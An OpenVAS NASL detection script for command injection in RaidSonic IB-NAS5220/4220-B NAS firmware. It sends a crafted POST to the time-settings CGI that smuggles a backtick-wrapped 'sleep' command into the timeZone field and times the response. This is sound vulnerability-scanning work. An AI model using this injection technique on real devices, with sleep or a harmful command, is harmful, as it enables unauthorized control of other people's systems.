###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_multiple_nas_57958.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# RaidSonic IB-NAS5220 and IB-NAS4220-B Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103793");
  script_bugtraq_id(57958);
  script_version("$Revision: 13659 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("RaidSonic IB-NAS5220 and IB-NAS4220-B Multiple Security Vulnerabilities");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2013-09-24 12:37:41 +0200 (Tue, 24 Sep 2013)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57958");

  script_tag(name:"impact", value:"The attacker may leverage these issues to bypass certain security
  restrictions and perform unauthorized actions or execute HTML and
  script code in the context of the affected browser, potentially
  allowing the attacker to steal cookie-based authentication
  credentials, control how the site is rendered to the user, or inject
  and execute arbitrary commands.");
  script_tag(name:"vuldetect", value:"Try to execute the 'sleep' command on the device with a special crafted POST request.");
  script_tag(name:"insight", value:"The remote NAS is prone to:

  1. An authentication-bypass vulnerability

  2. An HTML-injection vulnerability

  3. A command-injection vulnerability");
  script_tag(name:"solution", value:"Ask the Vendor for an update.");
  script_tag(name:"summary", value:"RaidSonic IB-NAS5220 and IB-NAS422-B are prone to multiple security
  vulnerabilities.");
  script_tag(name:"affected", value:"It seems that not only RaidSonic IB-NAS5220 and IB-NAS422-B are prone to this
  vulnerabilities. We've seen devices from Toshiba, Sarotech, Verbatim and others where it also
  was possible to execute commands using the same exploit. Looks like these devices are using
  the same firmware.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

port = get_http_port( default:80 );

url = '/login.cgi';
req = http_get( item:url, port:port);
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( "/loginHandler.cgi" >!< buf && "focusLogin()" >!< buf ) exit( 0 );

useragent = http_get_user_agent();
host = http_host_name( port:port );

sleep = make_list( 3, 5, 8 );

url = "/cgi/time/timeHandler.cgi";

foreach i( sleep ) {

  ex = 'month=1&date=1&year=2007&hour=12&minute=10&ampm=PM&timeZone=Amsterdam`sleep%20' + i  + '`&ntp_type=default&ntpServer=none&old_date=+1+12007&old_time=1210&old_timeZone=Amsterdam&renew=0';
  len = strlen( ex );

  req = 'POST ' + url + ' HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Accept-Encoding: identity\r\n' +
        'Proxy-Connection: keep-alive\r\n' +
        'Referer: http://' + host + '/cgi/time/time.cgi\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: ' + len + '\r\n' +
        '\r\n' +
        ex;

  start = unixtime();
  buf = http_send_recv( port:port, data:req, bodyonly:FALSE );
  stop = unixtime();

  if( "200 OK" >!< buf ) exit( 0 );
  if( stop - start < i || stop - start > ( i + 5 ) ) exit( 99 );
}

report = report_vuln_url( port:port, url:url );
security_message( port:port, data:report );

exit( 0 );
